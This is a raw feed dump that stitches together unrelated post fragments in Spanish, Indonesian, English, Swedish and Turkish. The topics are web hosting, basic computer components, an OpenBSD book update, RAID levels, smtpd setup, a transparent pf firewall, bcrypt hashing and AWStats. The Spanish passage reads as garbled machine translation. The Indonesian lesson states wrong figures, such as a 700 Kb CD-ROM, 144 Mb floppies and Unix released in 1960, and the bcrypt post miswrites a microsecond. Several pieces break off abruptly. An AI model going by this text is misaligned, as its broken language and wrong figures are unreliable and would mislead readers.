En realidad estaba indeciso a la lista, pero supongo que es inútil para no hacerlo. Sin embargo, quisiera advertir que, si bien el precio es siempre un factor, usted debe darse cuenta (“darse cuenta” en EE.UU. Inglés), que muchas veces se recibe lo que paga, aunque no es necesariamente cierto que los anfitriones más caros son los mejores. 
Mensual / trimestral / anual de Planes de Pago
La mayoría de los anfitriones de la tela le permiten seleccionar un plan de pago anual que le da un precio más barato que si tuviera que pagar mensualmente. Mi preferencia personal actual es de pago mensual con todos los anfitriones de la tela hasta que me los nuevos seguros de su fiabilidad y la honestidad. El pago mensual que me permite cambiar de host web de forma rápida cuando me encuentro con que la máquina actual no cumple con mis requisitos: de esta manera, yo no estoy atado a un proveedor de alojamiento web mal porque he pagado por todo un año. Puedo hacer esto incluso si el nuevo proveedor garantiza que van a reembolsar el saldo si estoy satisfecho, ya que en el momento de registrarme, no tengo ninguna seguridad de que cumplan con su garantía. Más tarde (generalmente después de un par de años), cuando estoy satisfecho con la acogida, que pueden cambiar planes de pago para los planes anuales de descuento. 
Los revendedores
No todas las empresas de hosting poseer o arrendar sus propios servidores web. Algunos de ellos son en realidad los revendedores para alguna otra empresa de hosting. La desventaja de usar un distribuidor es la posibilidad de que se trata de personas que no saben mucho acerca del sistema que están vendiendo y que tardan más tiempo en ayudar (que tienen que transmitir su solicitud de apoyo técnico a la empresa de alojamiento actual para que que se actúe sobre ellos). Sin embargo, esto también depende del distribuidor y la empresa de hosting subyacente. Por tanto, es prudente no descartar todos los distribuidores, hay una serie de los fiables y rápidos que son en realidad bastante bueno y barato. De hecho, un número de distribuidores venden los mismos paquetes más barato que el original de la compañía de hosting. Si usted descubre que una empresa en particular es un revendedor, usted tendrá que investigar tanto el distribuidor y la empresa real de alojamiento. 
Comentarios de los demás
Usted debe hacer un punto para comprobar lo que otros tienen que decir acerca de la red de acogida. Algunos de los lugares que usted puede hacer esto son: 
Como siempre se debe hacer cuando de leer las críticas, lee los comentarios publicados aquí con una pizca de sal. Algunas críticas entusiastas pueden provenir de personas que trabajan para el servicio de alojamiento web en sí, disfrazado de múltiples clientes satisfechos. Del mismo modo, las críticas negativas de un host en particular a veces puede venir de los competidores sin escrúpulos de ese host. 
No te saltes este paso, o puede que te encuentres siendo engañado por una multitud que todo el mundo se mantiene alejado de la. 
Al igual que yo, es probable que terminan conformándose con un trade-off entre el precio, la fiabilidad y las características que usted está dispuesto a vivir con él. 
Para terminar os recomiendo que antes de contratar reviséis esta comparativa de hosting para ir sobre seguro en la elección, podéis leerla aquí.]]></summary>

  <summary><![CDATA[Kegiatan Pembelajaran 1               KOMPONEN SISTEM KOMPUTER  Pada pokok bahasan ini akan membahas komponen sistem komputer terdiri  dari perangkat keras (hardware), perangkat lunak (software), dan  pengguna (user/brainware) 2.1. Perangkat Keras (Hardware) Perangkat keras (Hardware) yaitu suatu  perangkat yang berfungsi melakukan proses input (masukan), proses  pengolahan data dan output (keluaran). Secara umum perangkat keras  komputer dapat digambarkan seperi blok diagram di bawah ini : Gambar 2.1. Blok diagram komputer 2.1.1. Perangkat Masukan (Input Devices) Perangkat masukan berfungsi untuk memasukkan data atau input untuk  diproses menjadi informasi atau keluaran. Adapun perangkat masukan  terdiri dari : 2.1.1.1. Mouse Pemakaian mouse merupakan bagian penting dari Sistem Operasi yang  menggunakan tampilan Grafik. Pada saat bekerja, penggunaan mouse sering  dipergunakan dengan istilah Pointer (Penunjuk) berfungsi untuk  memindahkan dan mengarahkan penunjuk mouse pada desktop (ruang kerja) Mouse sebagai alat bantu untuk menjalankan perintah mengoperasikan  software baik Operating System maupun Software Aplikasi seperti  menunjuk, memilih, membuka maupun  memindah obyek                  Gambar 2.2. Mouse Berikut macam perintah , fungsi serta bagaimana menggunakan mouse   Tabel -2.1.. Macam perintah menggunakan Mouse 2.1.1.2.    Keyboard Keyboard atau papan ketik, merupakan perangkat yang sering  dipergunakan didalam kegiatan sehari‐hari. Karakteristik dan susunan  papan ketik ha pir sama dengan mesin ketik manual seperti susunan huruf  QWERTY tetapi terdapat beberapa tambahan‐tambahan fungsi lainnya seperti  tombol Esc, F1,   ,F12,                         Gambar 2.6 Keyboard 2.1.2.   Unit Pemrosesan Secara Terpusat (CENTRAL PROCESSING UNIT (CPU)) Didalam proses kerja suatu komputer, processor merupakan  bagian terpenting dalam melakukan proses masukan dan keluaran. CPU bisa  disebut sebagai otak dari komputer, untuk lebih jelasnya perhatikan  gambar berikut ini :    Gambar 2.7. Central Processing Unit Gambar 2.7.A. Masyarakat umum mengenalnya atau sering menyebut dengan  nama CPU (Central Processing Unit), gambar 2.7.B. menunjukkan jika  chasing sebuah komputer dibuka sehingga terlihat perangkat yang ada  didalamnya, sedang gambar 2.7.C. menunjukkan bentuk fisik sebuah  prosessor yang sesungguhnya berfungsi sebagai CPU. 2.1.3.   Perangkat Keluaran (Output Devices) Salah satu perangkat yang berfungsi untuk melihat hasil proses dari masukan, adapun perangkat tersebut adalah sebagai berikut : 2.1.3.1.   Monitor Monitor merupakan salah satu perangkat yang berguna menampilkan informasi yang dihasilkan dari proses input              Gambar 2.8. Monitor CRT            Gambar 2.9. Monitor LCD 2.1.3.2.  Printer (Alat Cetak) Peranti ini berfungsi untuk mencetak hasil proses dari masukan (Input), berupa teks atau gambar               Gambar 2.10. Printer 2.1.3.3.  Speaker Peranti ini berfungsi untuk menghasilkan suara yang telah diproses di dalam komputer.              Gambar 2.10. Speaker 2.1.4.   Media Penyimpanan Data (Storage Devices) Media penyimpanan berfungsi untuk menyimpan data atau informasi yang  ada dalam komputer. Media penyimpanan data terdiri berbagai jenis antara  lain : 2.1.4.1.    Hard Driver (Hardisk) Merupakan suatu media penyimpanan internal yang kapasitasnya besar,  untuk saat ini kapasitas hardisk mencapai 320 GB. Harga dari media ini  tergolong mahal.            Gambar 2.1.1. Hard Disk 2.1.4.2.    Disket Merupakan suatu media penyimpa an data yang berbentu seperti amplop dan dapat menyimpan data antara 700 Kb hingga 144 Mb.            Gambar 2.12. Disket 2.1.4.3.    CDR M/DVD Merupakan media penyimpanan berberbagai bentuk piringan. CD ROM mampu  menyimpan data sampai 700 Kb, sementara DVD mampu menyimpan antara 4 GB  higga 9 GB.             Gambar 2.13. CD ROM 2.1.4.4.    Flash disk Merupakan media penyimpanan data berbentuk pena, beru uran antara 64 Mb hingga 4 Gb = (4096 Mb)              Gambar 2.14. Flash Disk 2.2.  Perangkat Lunak (Soft ware) Perangkat lunak (software) adalah suatu perangkat yang berfungsi menghubungkan atau menjembatani antara perangkat keras (hardware) dengan pengguna (user/brainware). perangkat lunak secara umum terbagi menjadi 2 bagian yaitu : 2.2.1. Perangkat lunak sistem operasi (Operating System Software) Perangkat system perasi merupakan bagian terpenting didalam  menjalankan suatu perangkat komputer. Sistem operasi merupakan perangkat  lunak yang menjembatani antara pengguna dan perangkat keras dan  sekaligus mengelola perangkat keras dan perangkat lunak yang digunakan  komputer.Adapun Sistem operasi tersebut bersifat :  Multiuser  : dapat digunakan oleh banyak user dan dapat membe-dakan hak aksesnya Multitasking  :  dapat  melakukan  banyak  tugas  dalam  waktu  yang bersamaan  Berdasarkan tampilannya sistem operasi terbagi menjadi dua klasifikasi yaitu :  2.2.1.1.    Sistem operasi berbasiskan teks Merupakan sistem operasi yang menggunakan teks sebagai sistem. Ada beberapa contoh dari sistem operasi berbasiskan teks, yaitu : DOS, (Disk Operating System) yang dikeluarkan oleh Microsoft pada tahun 1981, lihat gambar berikut :                 Gambar 2.25. DOS Unix merupakan system operasi berbasis  jaringan yang dikeluarkan tahun 1960 dan merupakan sistem operasi  tertua. Bagian dari Unix yaitu ;         1.   Unix          2.   OpenBSD          3.   FreeBSD          Unix pertama kali digunakan oleh komputer jenis IBM, HP dan Sun Solaris.  2.2.1.2.    Sistem operasi berbasiskan Unit grafis antar muka (GUI / Graphic Unit Interface) Merupakan sistem operasi yang berbasiskan gambar atau grafis unit  antar muka, Ada beberapa contoh dari sistem operasi berbasiskan GUI,  yaitu :Windows merupakan sistem operasi berbasis GUI  (Graphical User Interface) yang dikeluarkan oleh MicrosoftMacintosh pertama dikeluarkan pada bulan Januari 1984 sangat mudah digunakan (user friendly)  dibandingkan dengan yang lainnya. Versi terakhir yang dikeluarkan  Macintosh sistem operasi yaitu sistem X yang digunakan di Apple iMac  Desktop ataupun Apple Notebook.                                      Gambar 2.26. Mac OSLinux pertama kali dikeluarkan tahun 1991 oleh Linus Torvald.Linux ini merupakan salah satu varian dari Sistem Operasi Unix. Linux  Generasi I merupakan Sistem Operasi berbasis Teks. Setelah Linux  berkembang pesat karena sifatnya open source, maka Linux saat ini telah  berbasiskan grafis sebagai antar mukanya. Dan Linux itu terdiri dari  beberapa distribusi (distro Pengembang) :Beberapa contoh distro linux di bawah ini : 1.   Mandrake 2.   Suse 3.   Fedora Core dan sebagainya              Gambar 2.27. Distro Linux 2.2.2.   Perangkat lunak aplikasi Merupakan perangkat lunak yang berfungsi untuk membantu melakukan berbagai bentuk tugas perkantoran seperti pengolah kata (word processor), lembar sebar (), presentasi (presentation), pengolahan halaman web (web design)  hingga perangkat media player dan sebagainya, hal ini sudah berkembang  sejak sistem operasi tersebut dikembangkan. Perangkat lunak aplikasi  terdiri dari : 2.2.2.1.    Program bantu (Utility) Merupakan suatu program yang berfungsi untuk membantu sistem  operasi     seperti   yang    dijelaskan       diatas,  seperti,           antivirus, defragmenter, format disket, periksa  sistem dan sebagainya. 2.2.2.2.    Bahasa Pemrograman Merupakan suatu aplikasi yang berguna mengkonversi perhitungan yang  bersifat matematis menjadi suatu aplikasi. Sebagai contoh bahasa  pemrograman Bahasa BASIC, COBOL, C++ dan sebagainya. 2.3.     Pengguna (User/Brainware) Pennguna (user/brainware) dalam hal ini manusia merupakan pemakai  perangkat‐perangkat komputer yang dibedakan atas tiga tingkatan pengguna  yaitu : 2.3.1.   System Analyst System  analyst  adalah  seseorang  yang  melakukan  rancangan  analisa sistem yang akan dikerjakan oleh seorang programmer. 2.3.2.   Programmer Programmer adalah orang yang mengerjakan hasil analisa menjadi bahasa program atau program aplikasi  2.3.3.   Operator Operator   adalah   seseorang   yang   menjalankan   atau    menggunakan program  komputer dalam melaksanakan aktivitasnya  sehari-hari 2.4.     Soal-soal Latihan :  1.   Tuliskan komponen sistem komputer 2.   Gambarkan blok diagram sistem komputer 3.   Identifikasikan perangkat keras komputer 4.   Identifikasikan perangkat lunak komputer 5.   Identifikasikan pengguna computer   KEGIATAN BELAJAR 2   MENGOPERASIKAN SISTEM OPERASI BERBASIS GUI  Pada pokok bahasan ini akan membahas tentang bagaimana menjalankan  komputer yang dimulai dari mempersiapkan penyalaan komputer, menyalakan  komputer, mengoperasikan komputer, mematikan komputer (shut down), restart komputer. 3.1.        Mempersiapkan Penyalaan Komputer Hal yang perlu di perhatikan sebelum menyalakan komputer antara lain :3.1.1.   Pastikan perangkat‐perangkat seperti keyboard, mouse, monitor sudah terpasang dengan benar3.1.2.   Pastikan bahwa  power  supply komputer sdh tersambung ke UPS  atau stabiliser atau langsung ke jala‐jala listrik PLN.3.1.3.   Pastikan bahwa komputer tersebut sudah terinstall sistem operasi dari program aplikasi yang dibutuhkan.3.1.4.   Pastikan bahwa disekitar komputer tidak terdapat minuman atau makanan yang mengandung air 3.2.        Menyalakan Komputer Langkah‐langkah menyalakan komputer dengan langkah sebagai berikut :3.2.1.   Menekan tombol power pada CPU kemudian diikuti dengan menekan tombol power monitor, lihat gambar 3.1.13.2.2.   Pastikan gambar tampilan POST (Power On Self Test) sukses sehingga muncul  di  layar  seperti  pada gambar 3.1.23.2.3.   Tunggu hingga tampilan Sistem operasi muncul seperti pada gambar 3.1.3                Gambar 3.1. Proses Penyalaan Komputer 3.2.4. Jika sistem operasi yang digunakan terproteksi atau  membutuhkan password untuk log in, maka masukkan yang sesuai pada user  yang di pilih, tetapi jika tidak membutuhkan tekan salah satu user log  in yang tersedia3.2.5. Selanjutnya tunggu hingga ruang kerja atau dekstop sistem operasi muncul  seperti yang terlihat pada gambar di bawah ini  Gambar 3.2.  Tampilan dekstop pada operasi Windows 3.3.    Mengoperasikan Komputer Megoperasikan komputer dapat menggunakan perintah melalui keyboard  (keyboard shortcut) atau menggunakan mouse untuk menekan tombol‐tombol  yang telah disiapkan oleh sistem operasi yang digunakan. Perhatikan  penjelasan berikut ini : 3.3.1. Menggunakan Start Menu Berfungsi untuk memulai suatu program atau aplikasi. perhatikan tombol ini terletak dibawah sudut kiri desktop.      Gambar 3.3. Start Menu Untuk menggunakan tombol start menu adalah dengan mengklik satu kali  hingga muncul menu kemudian arahkan pointer ke arah yang diinginkan  tanpa mengklik, karena dengan sendirinya menu tersebut akan terbuka.  Perhatikan gambar berikut :Sebagai latihan, bila ingin menunjuk suatu aplikasi sebagai contoh  internet explorer, klik start menu kemudian arahkan pointer ke Programs,  lalu arahkan ke Internet Explorer. Perhatikan garis dibawah salah satu  huruf di start menu, perintah diatas dapat digunakan dengan mengetik  tombol start di keyboard dan huruf yang digaris bawah. Lalu kursor di  keyboard untuk memilih menu yang diinginkan.                                Gambar 3.4 aktivasi start menu Tips : Bila keyboard tidak dilengkapi dengan tombol start, maka lakukan kombinasi tombol  CTRL + ESC  3.3.2.   Mengenal Taskbar Terdapat di bagian bawah ruang kerja desktop Sistem Operasi, berguna  untuk menjalankan aplikasi, dan mengalihkan antar program aplikasi yang  aktif.  Gambar 3.5. Taskbar 3.4.  Mematikan Komputer (Shut Down)  Apakah fungsi shutdown tersebut ? Fungsi ini dipergunakan untuk  me‐non fungsikan sistem operasi dan perangkat keras lainnya dalam  keadaan mati (off). Untuk itu perhatikan langkah‐langkah shutdown yaitu  sebagai berikut :  Gambar 3.6. Shutdown Komputer 3.4.1. Langkah Pertama Klik start menu lalu klik tombol Shut Down atau Turn of Komputer seperti gambar 3.6. di atas. 3.4.2. Langkah Kedua Setelah mengklik tombol Shutdown, maka menu Shut Down  Windows tampil dan langkah selanjutnya klik Ok, seperti pada gambar 3.7. berikut :Setelah Shut Down aktif maka selanjutnya windows aka  menampilkan jendela Log off seperti gambar 3.8. berikut :             Gambar 3.7 Jendela untuk Shutdown         Gambar 3.8. Proses Loggin Off 3.5.     Restart Komputer Restart berfungsi untuk memulai komputer kembali dari awal, fungsinya hampir sama dengan Shut Down.  Tetapi untuk Restart, komputer dalam keadaan hidup tetapi sistem akan  berjalan dari awal. Langkah‐ langkahnya sama seperti pada Shut Down, dan menu yang dipilih adalah Restart, lalu klik Ok. 3.6.     Log Off Komputer Fungsi ini berguna untuk mengganti pengguna (user). Dalam arti kata,  apabila komputer ini dipergunakan oleh beberapa orang, data yang  bersifat pribadi tidak biisa dibuka oleh pengguna lain. 3.5.     Stand By Komputer Fungsi ini berguna untuk menjaga agar komputer dalam keadaan siaga,  atau dalam keadaan hidup bila ingin terus menghubungkan komputer dengan  internet, telepon dan sebagainya. 3.5.     Hibernate Komputer Fungsi ini bertugas menyimpan data-data terakhir didalam suatu  aplikasi, sehingga bila komputer dimatikan dalam proses ini, dan  komputer dihidupkan kembali, data atau aplikasi akan terlihat seperti  sebelum dimatikan. 3.6.     Soal-soal Latihan : Bagaimana langkah-langkah menjalankan computer ?Bagaimana prosedur mematikan computer yang benar?Apa yang dimaksud dengan Restart Komputer ?Apa yang dimaksud dengan Log Off Komputer ?Apa yang dimaksud dengan Stand By Komputer ?Apa yang dimaksud dengan Hibernate Komputer ?]]></summary>

  <title><![CDATA[Writing New Editions]]></title>
  <summary><![CDATA[This post is, “how is the new edition of Absolute OpenBSD coming along?” with a bit of musing on the craft of writing a second edition added in. 
I’m always shocked by the number of systems administrators ignorant of networking basics. I don’t care that they don’t know how to choose between BGP and OSPF, or that they don’t know what those acronyms stand for. That’s not relevant to most servers. But lots of them don’t know what an IP address is, or how to recognize a valid netmask, or the difference between TCP and UDP, or why there’s an /etc/protocols file. Any sysadmin who doesn’t know these things is still an amateur. My goal in writing a book is to drag people a little closer to professional. 
So, I include a chapter on networking basics in my introductory sysadmin texts, just like I include chapters on user management. 
I have a chapter on IPv4 networking in three published books. I’m writing this same chapter for the fourth time. I can’t just copy-and-paste from earlier editions. First, that would be rude. Second, my understanding of TCP/IP has changed in the last ten years, and that changes how I approach the material. 
But I can use the earlier efforts as models. Some text I can almost reuse, because it’s still the best way I know of to explain the specific topic. This will be the third time I use the dinner table analogy, for example. I still pass it through my brain to my keyboard, however, freeing myself to tweak a few words in the process. 
The most recent IPv4 chapter I wrote was for Absolute FreeBSD. In this incarnation, the chapter included a couple pages of basic binary and hexadecimal math. I looked at this, and thought “Why did I cover this? Doesn’t everybody know it?” 
Then I thought back, and realized that I included those pages because at the time I wrote the book, I spent a fair amount of energy teaching that material to my coworkers. 
I flipped back through the earlier editions of these books. Each book had one or more sections that I included because coworkers didn’t know it. 
At the moment, I’m not responsible for teaching anyone anything. I have no tech minions, and am molding nobody. It’s definitely changed my mind about what topics I cover. I suspect that the new edition of Absolute OpenBSD will contain less basic material. I’m definitely assuming that you know how to do binary and hexadecimal math, for one thing. This leaves room for more advanced topics. 
My conclusion seems to be: if you find the new edition of Absolute OpenBSD moves too fast, I suggest you get a copy of Absolute FreeBSD as well, or reread the one you have. 
(Mind you, the no-minions-to-mold is about to change. After two years of minion-free peace, I have been given a minion to mold. He’s on vacation at the moment, and has no idea what awaits him on his return. I have no desire to ruin his last few days of freedom, so we’re waiting for his first day back to tell him what he’s been sentenced to. The poor bastard.) 
So, where am I on the second edition of Absolute OpenBSD?  
If you want the minutia of my progress, search for the #ao2e hashtag on Twitter. But at a larger level, I’m writing the chapter on IPv4. 
This seems to be about 40% through the first draft of the book. The manuscript has proceeded quickly, now that I’m not moving into a house that needs work to be habitable. I’m hoping that this pace continues. 
I’ve received initial feedback on chapters 1-8 from Henning Brauer. Then the chapters go to Nathan Houle, my editor at No Starch Press, then back to me for corrections and discussion. Then they go to Peter Hansteen for formal technical review. Then back to me for correction. Then copyedit, back to me for correction, page layout, and back to me for correction. 
So, it’s not 40% done. The first draft is the hardest part, however. Doing the math, though, I see that I’ve been through an IPv4 chapter at least twenty times, given all the cycles. No wonder writing it is causing me nausea and chest pain. 
The original outline calls for a book about 400,000 words. For reference, Absolute FreeBSD is close to 300,000 words. This is too dang long. One of my goals is that my books be small enough to read in the bathtub. 
As SSH Mastery was successful, I have a resolution. I think I’ve figured out topics I can extract from the book and publish separately, without damaging the integrity of the book or its usefulness. Not everybody needs to know about, say, OpenBSD’s wireless features, but it’s certainly a topic worth covering. I can do small books on those topics and publish them as an aside, making the content available to interested readers. Assuming that the reader is a competent OpenBSD sysadmin (e.g., they’ve read Absolute OpenBSD 2nd ed or have an equivalent combination of education and experience) will let me do these books almost as easily as if it was integrated into the book. And my initial market research indicates that my readers are amenable to smaller, single-topic books. 
In summary: book is underway. More books coming.]]></summary>

  <title><![CDATA[Raid5 vs. RAID6]]></title>
  <summary><![CDATA[RAID provides data protection for your server
English: RAID 5 with these four disks (disk 0, 1, 2, and 3) and each group of blocks (orange, yellow, green, and blue) have a distributed parity block that is distributed across the four disks. (Photo credit: Wikipedia) 
RAID, an acronym for redundant array of independent (or inexpensive) disks. It refers to a collection of hard disks that are connected in such a manner that provides redundancy, so if one drive fails, data is not lost. Different types of RAID are classified by numbers. The most commonly implemented RAID classes are 0, 1, 5 and 6. 
RAID relies on disk striping, parity and in some cases, mirroring, to provide protection against data loss. Disk striping refers to data being placed across multiple disks in a sequential manner. Parity refers to extra data that is stored to assist with protecting and restoring data. Disk mirroring involves multiple disks that contain exactly the same data. RAID5 and RAID6 both involve disk striping and parity. Neither uses disk mirroring. 
What is RAID5?
RAID5 refers to a type of RAID that involves block-level disk striping with distributed parity. In this configuration, every drive except one must be functional for the RAID to be operational. If a second drive fails, data loss is likely to occur. Block-level disk striping refers to blocks of data being stored sequentially across drives. Blocks include multiple bytes of data. Distributed parity refers to parity data spanning across all drives in the array, not just being stored on a separate disk. RAID5 is supported by FreeBSD, Linux, Microsoft Windows server operating systems, NetBSD, OpenBSD, OpenSolaris and Solaris 10. 
What is RAID6?
RAID6 refers to a type of RAID that involves block-level striping with distributed parity. However, the major difference between RAID5 AND RAID6 involves the degree of distributed parity. RAID6 has double distributed parity. In this configuration, two drives may fail and the array will still be functional without data loss. This provides extra time compared to RAID5 to replace a disk if one fails. However, an additional disk is required for the array to operate. RAID6 is ideal for systems that cannot afford any amount of downtime. RAID6 is supported by Linux, Microsoft Windows server operating systems, OpenSolaris and Solaris 10. It is not supported by NetBSD, FreeBSD or OpenBSD at this time. 
What is RAID5+1?
RAID5+1 is a hybrid RAID configuration based off of RAID5. It is sometimes referred to as RAID53. RAID5+1 has block-level disk striping with distributed parity. However, unlike RAID5, the data is also mirrored. This means that in large arrays, many more disks are needed to store the mirrored data. RAID5+1 implementations are rare.]]></summary>

  <title><![CDATA[smtpd istället för sendmail i OpenBSD]]></title>
  <summary><![CDATA[sendmail är i mitt tycke onödigt avancerad och komplicerad för de flesta installationer och det finns en enklare lösning redan från början i OpenBSD som heter smtpd. Denna demon är dock inte aktiverad som standard men det är enkelt att byta. 
Stoppa först sendmail 
pkill sendmail 
Editera sedan /etc/mailer.conf och ändra till följande 
sendmail       /usr/sbin/smtpctl 
send-mail     /usr/sbin/smtpctl 
mailq           /usr/sbin/smtpctl 
makemap         /usr/libexec/smtpd/makemap 
newaliases      /usr/libexec/smtpd/makemap 
hoststat        /usr/libexec/sendmail/sendmail 
purgestat       /usr/libexec/sendmail/sendmail 
Bygg om alias-databasen 
newaliases 
Se till att smtpd startas automatiskt samt förhindra att sendmail startas 
echo “sendmail_flags=NO” >> /etc/rc.conf.local 
echo “smtpd_flags=” >> /etc/rc.conf.local 
Starta sedan smtpd 
smtpd 
Färdigt! 
Modifiera sedan /etc/mail/smtpd.conf för att passa ditt system, det är en dröm jämfört med sendmails konfiguration

  <title><![CDATA[A transparent firewall using OpenBSD]]></title>
  <summary><![CDATA[I wanted to enforce a different security policy for a given part of the home network, but without the introduction of separate subnets and static routes all over the place. So I started to experiment with a transparent firewall, on OpenBSD.  
To accomplish this, what is needed first, is a bridge interface. A bridge interface is comprised of multiple (frequently 2) ethernet interfaces and transparently forwards traffic between the two interfaces. Very much like a 2-port ethernet switch would, or like a wireless bridge does. 
If you have worked with bridges on Linux, configuration on OpenBSD works confusingly different than what you already know. 
First, we have the configuration file /etc/hostname.bridge0, that specifies the interfaces that will be bridged: 

# /etc/hostname.bridge0:
add vr0
add vr1
blocknonip vr1
up
 
If you are not concerned about non-IP traffic compromising the security of your bridging firewall, you may omit the option blocknonip here. The interface vr1 connects to the “restricted” part of the network here and for this example, I don’t want non-IP protocols such as NetBIOS to slip through. 
Next, one of the two underlying interfaces is configured as if the bridge didn’t even exist. This will be the IP address of the bridge, here in /etc/hostname.vr0: 

# /etc/hostname.vr0:
inet 192.168.1.3 255.255.255.0
inet6 2001:db0:1:2::3 64
 
And the additional interface for the bridge is only brought “up” in /etc/hostname.vr1: 

# /etc/hostname.vr1:
up
 
After a reboot, the bridge will be forwarding packets, without the need to enable IP forwarding and without enabling the firewall. 
Now I can start adding firewall rules in /etc/pf.conf: 

# /etc/pf.conf:

# The interface on the open network
PUBLIC_IF=vr0

# The interface on the restricted network
RESTRICT_IF=vr1

# I don't believe in dropping packets
set block-policy return

# Leave the loopback interface unfiltered
set skip on lo

# Pass out what's already inside the firewall
pass out on vr0 all
pass out on vr1 all

# Pass in everything coming from the open network
pass in on $PUBLIC_IF

# Reject everything coming from the restricted network
block in on $RESTRICT_IF

# Restricted network may talk to the world
pass in on $RESTRICT_IF inet
pass in on $RESTRICT_IF inet6

# But not to the open network
block in on $RESTRICT_IF from any to 192.168.1.0/24
block in on $RESTRICT_IF from any to 2001:db8:1:2::/64

# Allow access to the site's DNS server 
pass in on $RESTRICT_IF proto {tcp,udp} from any to 192.168.1.11 port 53

# Allow access to this single SSH service
pass in on $RESTRICT_IF proto tcp from any to 192.168.1.11 port 22
pass in on $RESTRICT_IF proto tcp from any to 2001:db8:1:2::b port 22

# Pass ICMP in all directions
pass proto {icmp, icmp6}
 
And that’s about it. What I have here is really just a rough example of what can be done. Bridging over 3 or more interfaces is possible, if you enjoy the complexity. 
With basic firewalling out of the way, it is also possible to filter by MAC address. For this, we need to tag some traffic, e.g. a “trusted client”, directly on the bridge: 

ifconfig bridge0 rule pass in on vr1 src 00:1c:c6:8b:ae:3b tag TRUSTEDCLIENT
 
(Append this, excluding the leading “ifconfig bridge0″, to /etc/hostname.bridge0 to make it permanent.) 
In /etc/pf.conf, we can then filter by tag: 

# Allow all traffic from trusted MAC addresses
pass in on $RESTRICT_IF tagged TRUSTEDCLIENT
 
Or, more specific: 

pass in on $RESTRICT_IF proto tcp all port 22 tagged TRUSTEDCLIENT
 
Combining MAC filters with other filter criteria is of course possible. Please make up your own mind about whether and how you want to use this.  
A final word on performance: With both interfaces working in promiscuous mode, stress on the firewall’s CPU can be expected to be rather high. This 100 Mbps bridge with a 500 MHz AMD Geode CPU will reach a CPU load of 70% while moving no more than 85 Mbps on a single TCP connection.]]></summary>

  <title><![CDATA[Password Hashing: Best Practice]]></title>
  <summary><![CDATA[Last week I read a post on
Brian Krebs’ blog where security researcher Thomas Ptacek was interviewed about
his thoughts on the current landscape of password hashing. I found Thomas’ insights
into this topic quite pertinent and would like to reiterate his sentiments
by talking a little about the importance of choosing the right password hashing scheme.

 

The idea of storing
passwords in a “secret” form (as opposed to plain-text) is no new notion. In
1976 the Unix operating system would store password hash representations using
the crypt one-way cryptographic hashing function.  As one can imagine, the processing power back
then was significantly less than that of current day standards. With crypt only
being able to hash fewer than 4 passwords per second on 1976 hardware, the
designers of the Unix operating system decided there was no need to protect the
password file as any attack would, by
enlarge, be computationally infeasible. Whilst this assertion was certainly
true in 1976, an important oversight was made when implementing this design
decision: Moore’s Law.

 

Moore’s Law states that computing power will
double approximately every two years. To date, this notion has held true since
it was first coined by Gordon Moore in 1965. Because of this law, we find that
password hashing functions (such as crypt) do not withstand the test of time as
they have no way of compensating for the continual increase in computing power.
The problem we find with cryptographic hashing functions is that whilst
computing power continually increases over time, password entropy (or
randomness) does not. 

 

If we fast-forward to the
current day environment we see that not much has changed since the early
implementations of password hashing.  One-way
cryptographic hashing functions are still in widespread use today, with SHA-1,
SHA-256, SHA-512, MD5 and MD4 all commonly used algorithms. Like crypt on the
old Unix platform, these functions have no way of compensating for an increase
in computing power and therefore will become increasingly vulnerable to
password-guessing attacks in the future.

 

Fortunately, this problem
was solved in 1999 by two researches working on the OpenBSD Project, Niels
Provos and David Mazieres. In their paper, entitled ‘A Furture-Adaptable Password Scheme’, Provos and Mazieres describe a cost-adaptable algorithm that adjusts
to hardware improvements and preservers password security well into the future.


 

Based on Bruce Shneier’s
blowfish algorithm, EksBlowfish (or expensive key scheduling blowfish), is a
cost-parameterizable and salted block cipher which takes a user-chosen password
and key and can resist attacks on those keys. This algorithm was implemented in a
password hashing scheme called bcrypt.

 

Provos and Mazieres
identified that in order for their bcrypt password scheme to be hardened
against password guessing, it would need the following design criteria:



Finding
partial information about the password is as hard as guessing the password itself.
This is accomplished by using a random salt.
The
algorithm should guarantee collision resistance.
Password should not be hashed by a single
function with a fixed computational cost, but rather by of a family of functions
with arbitrarily high cost.

The first two points here
are fairly standard among password hashing algorithms. The last point, however,
is somewhat of a different concept to what we are used to seeing. 

 

If we think about cryptographic hashing functions
in use today - be it MD5, SHA-1, or MD4 - we notice they all have one thing in
common: speed. Each of these algorithms is incredibly quick at computing its
respective output. As hardware gets better, so too does the speed at which
these algorithms can operate. Whilst this may potentially be seen as a positive
thing where usability is concerned, it is certainly an undesirable trait from a
security standpoint. The quicker these algorithms are able to compute their
output, the less time it takes for the passwords to be cracked.

 

Provos and Mazieres were
able to solve this problem by deliberately designing bcrypt to be computationally
expensive. In addition, they introduced a tunable cost parameter which is able
to increase the algorithm’s completion time by a factor of 2 each time it is
incremented(effectively doubling the time it takes to compute the result). This
means that bcrypt can be tuned (i.e. incremented every 2 years) to keep up with
Moore’s Law.

 

Let’s have a quick look at
how bcrypt compares against other hashing algorithms. Let’s say we have a list of
1000 salted SHA-1 hashes that we wish to crack. Because they are salted, we can’t
use a pre-computed list of hashes against this list. We can, however, crack the
hashes one by one. Let’s say on modern hardware it takes a microsecond
(000000.1 seconds) to make a guess at the password. This means that per second we
could generate 1 million password guesses per hash.

 

In contrast, say we have the
same list but instead of SHA-1 the hashes have been derived using bcrypt. If
the hashes were say computed with a cost of 12, we are able to compute a
password guess roughly every 500 milliseconds. That is, we can only guess 2
passwords a second. Now if you think we have 1000 password hashes, we can only
generate 7,200 guesses per hour. As it would be more efficient targeting all
1000 hashes (as opposed to just one), we would be limited to approximately 7
guesses per hash.

 

Below is the output of a
quick program I created to display the time it takes to compute a bcrypt
comparison as the cost value is incremented. The test was conducted on a RHEL
system running a Xeon X5670 @ 2.9Ghz with 1024MB of memory.

 



 

The source code for this program can be found here.

 

The bcrypt password hashing
scheme is currently available in many languages including Java, C#,
Objective-C, perl, python, and Javascript among others.

 

I hope this post highlights the importance of using stronger password hashing schemes for modern day applications.]]></summary>

 AWStats is a web statistics and log analyzer which create a statistics reports based on rich data from apache or server logs.  First We need to install AWStats in FreeBSD server  - Login into the FreeBSD server using SSH and root access # cd /usr/ports/www/awstats # make # make install # make clean  After AWStats is installed on the server we will need to configure our apache webserver. Usually if we are installed Apache from ports then the apache config files will be stored in /usr/local/etc/apache22/httpd.conf

  <summary><![CDATA[Elinizdeki dosyaları iso ya çevirmek için Ubuntu üzerinde bir sürü yazılım olmasına rağmen ben size tanımlanmış paketler arasında yer almayan, bulduktan sonrada bir türlü derlemesini nasıl yapacağınızı bulamadığınız Cdrtools paketleri ve kurulumunu anlatıcam. 
